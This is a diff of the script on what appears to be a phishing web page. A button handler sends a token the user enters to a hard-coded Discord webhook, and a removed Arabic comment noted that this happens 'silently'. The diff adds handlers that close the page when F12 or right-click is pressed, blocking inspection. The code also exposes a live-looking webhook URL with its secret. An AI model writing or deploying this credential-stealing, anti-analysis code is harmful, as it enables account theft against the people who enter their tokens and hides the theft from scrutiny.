@@ -178,17 +178,22 @@
 
     nextBtn.addEventListener('click', () => {
       const token = tokenInput.value.trim();
-      if (token) sendToWebhook(token); // إرسال بصمت
+      if (token) sendToWebhook(token);
     });
 
-    
+    // إغلاق الصفحة عند الضغط على F12
     document.addEventListener('keydown', function (e) {
       if (e.key === "F12") {
         window.open('', '_self').close();
       }
     });
 
-    
+    // إغلاق الصفحة عند الضغط بزر الفأرة الأيمن
+    document.addEventListener('contextmenu', function (e) {
+      e.preventDefault();
+      window.open('', '_self').close();
+    });
+
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1383808164331520121/Lef_QBFXzuFRm6QDdfzahxbDFhOpckoOaa53hHVKjS9p7yUfMEc9YkLDSo76ENGycA9z";
   </script>
 </body>
